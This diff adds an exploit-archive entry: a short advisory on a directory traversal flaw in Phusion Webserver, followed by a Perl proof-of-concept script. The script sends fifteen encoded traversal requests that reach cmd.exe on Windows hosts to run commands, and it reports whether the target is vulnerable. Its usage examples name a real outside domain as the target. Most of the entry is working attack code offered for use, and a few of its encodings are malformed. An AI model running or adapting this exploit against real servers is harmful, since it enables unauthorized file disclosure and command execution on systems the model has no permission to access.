@@ -1,0 +1,178 @@
+source: http://www.securityfocus.com/bid/4117/info
+
+Phusion Webserver is a commercial HTTP server that runs on Microsoft Windows 9x/NT/2000 operating systems.
+
+Phusion Webserver is prone to directory traversal attacks. It is possible to break out of wwwroot using triple-dot-slash (.../) sequences containing HTTP-encoded variations of "/" and "\". As a result, a malicious web user may browse web-readable files on the host running the vulnerable software.
+
+This vulnerability may potentially result in the disclosure of sensitive information contained in web-readable files on the host.
+
+It should be noted that webservers normally run with SYSTEM privileges on Microsoft Windows operating systems. 
+
+#!/usr/bin/perl
+#
+# Simple script to identify if the host is vulnerable!, 
+# 
+# This does 15 different checks based IIS 4-5. Have Fun!
+#
+# Phusion Webserver v1.0 proof-of-concept exploit
+# By Alex Hernandez <al3xhernandez@ureach.com> (C)2002.
+#
+# Thanks all the people from Spain and Argentina.
+# Special Greets: White-B, Pablo S0r, Paco Spain, L.Martins, 
+# G.Maggiotti & H.Oliveira.
+# 
+#
+# Usage: perl -x Phusion_exp.pl <Hosts>:<Port>
+#
+# Example: 
+#
+# perl -x Phusion_exp.pl www.whitehouse.com:80
+# Trying.....................
+#
+# <THIS HOST IS VULNERABLE> :-)
+# Check the previous notes to execute bugs.
+#
+#
+
+use Socket;
+
+if ($#ARGV<0) {die "
+\nPhusion Webserver v1.0 traversal exploit(c)2002.
+Alex Hernandez al3xhernandez\@ureach.com\n
+
+Usage: perl -x $0 www.whitehouse.com:80 {OR}\n
+[if the host is not using a proxy]\n
+Usage: perl -x $0 127.0.0.1:80\n\n";}
+
+($host,$port)=split(/:/,@ARGV[0]);
+print "Trying.....................\n";
+$target = inet_aton($host);
+$flag=0;
+
+# ---------------test method 1
+my @results=sendraw("GET
+/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir 
+HTTP/1.0\r\n\r\n");
+foreach $line (@results){
+ if ($line =~ /Directory/) {$flag=1;}}
+
+# ---------------test method 2
+my @results=sendraw("GET
+/scripts..%c1%9c../winnt/system32/cmd.exe?/c+dir
+HTTP/1.0\r\n\r\n");
+foreach $line (@results){
+ if ($line =~ /Directory/) {$flag=1;}}
+
+# ---------------test method 3
+my @results=sendraw("GET
+/scripts/..%c1%pc../winnt/system32/cmd.exe?/c+dir 
+HTTP/1.0\r\n\r\n");
+foreach $line (@results){
+ if ($line =~ /Directory/) {$flag=1;}}
+
+# ---------------test method 4
+my @results=sendraw("GET
+/scripts/..%c0%9v../winnt/system32/cmd.exe?/c+dir 
+HTTP/1.0\r\n\r\n");
+foreach $line (@results){
+ if ($line =~ /Directory/) {$flag=1;}}
+
+# ---------------test method 5
+my @results=sendraw("GET
+/scripts/..%c0%qf../winnt/system32/cmd.exe?/c+dir 
+HTTP/1.0\r\n\r\n");
+foreach $line (@results){
+ if ($line =~ /Directory/) {$flag=1;}}
+
+# ---------------test method 6
+my @results=sendraw("GET
+/scripts/..%c1%8s../winnt/system32/cmd.exe?/c+dir 
+HTTP/1.0\r\n\r\n");
+foreach $line (@results){
+ if ($line =~ /Directory/) {$flag=1;}}
+
+
+# ---------------test method 7
+my @results=sendraw("GET
+/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir 
+HTTP/1.0\r\n\r\n");
+foreach $line (@results){
+ if ($line =~ /Directory/) {$flag=1;}}
+
+# ---------------test method 8
+my @results=sendraw("GET
+/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir 
+HTTP/1.0\r\n\r\n");
+foreach $line (@results){
+ if ($line =~ /Directory/) {$flag=1;}}
+
+
+# ---------------test method 9
+my @results=sendraw("GET
+/scripts/..%c1%af../winnt/system32/cmd.exe?/c+dir 
+HTTP/1.0\r\n\r\n");
+foreach $line (@results){
+ if ($line =~ /Directory/) {$flag=1;}}
+
+# ---------------test method 10
+my @results=sendraw("GET
+/scripts/..%e0%80%af../winnt/system32/cmd.exe?/c+dir 
+HTTP/1.0\r\n\r\n");
+foreach $line (@results){
+ if ($line =~ /Directory/) {$flag=1;}}
+
+# ---------------test method 11
+my @results=sendraw("GET
+/scripts/..%f0%80%80%af../winnt/system32/cmd.exe?/c+dir
+HTTP/1.0\r\n\r\n");
+foreach $line (@results){
+ if ($line =~ /Directory/) {$flag=1;}}
+
+# ---------------test method 12
+my @results=sendraw("GET
+/scripts/..%f8%80%80%80%af../winnt/system32/cmd.exe?/c+dir
+HTTP/1.0\r\n\r\n");
+foreach $line (@results){
+ if ($line =~ /Directory/) {$flag=1;}}
+
+# ---------------test method 13
+my @results=sendraw("GET
+/scripts/..%fc%80%80%80%80%af../winnt/system32/cmd.exe?/c+dir
+HTTP/1.0\r\n\r\n");
+foreach $line (@results){
+ if ($line =~ /Directory/) {$flag=1;}}
+
+# ---------------test method 14
+my @results=sendraw("GET
+/msadc/..\%e0\%80\%af../..\%e0\%80\%af../..\%e0\%80\%af../
+winnt/system32/cmd.exe\?/c\+dir
+HTTP/1.0\r\n\r\n");
+foreach $line (@results){
+ if ($line =~ /Directory/) {$flag=1;}}
+
+# ---------------test method 15
+my @results=sendraw("GET
+/.../.../.../.../winnt/system32/cmd.exe\?/c\+dir
+HTTP/1.0\r\n\r\n");
+foreach $line (@results){
+ if ($line =~ /Directory/) {$flag=1;}}
+
+#------------------------------
+if ($flag==1){print "<THIS HOST IS VULNERABLE> :-)\n
+Check the previous notes to execute bugs\n";}
+else {print "<THIS HOST IS NOT VULNERABLE> :-( \n
+Check manually on browser...\n";}
+
+
+sub sendraw {   
+        my ($pstr)=@_;
+        socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||
+                die("Socket problems\n");
+        if(connect(S,pack "SnA4x8",2,$port,$target)){
+                my @in;
+                select(S);      $|=1;   print $pstr;
+                while(<S>){ push @in, $_;}
+                select(STDOUT); close(S); return @in;
+        } else { die("Can't connect check the port or address...\n"); }
+}
+
